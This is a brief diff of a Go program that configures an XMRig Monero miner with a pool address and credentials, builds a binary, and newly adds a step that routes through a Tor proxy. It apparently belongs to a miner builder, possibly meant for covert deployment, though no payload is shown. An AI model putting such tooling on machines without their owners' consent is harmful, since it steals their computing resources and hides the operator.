@@ -6,6 +6,7 @@ import (
 	"os/exec"
 	"log"
 	"runtime"
+
 	"io/ioutil"
 	"strings"
 )
@@ -90,6 +91,8 @@ func main() {
 				}
 				configure_xmrig("donate.v2.xmrig.com:3333", "mott", "abc123")
 				generate_bin()
+				fmt.Println("checking tor proxy...")
+				main_tor()
 			}
 		}
 	}
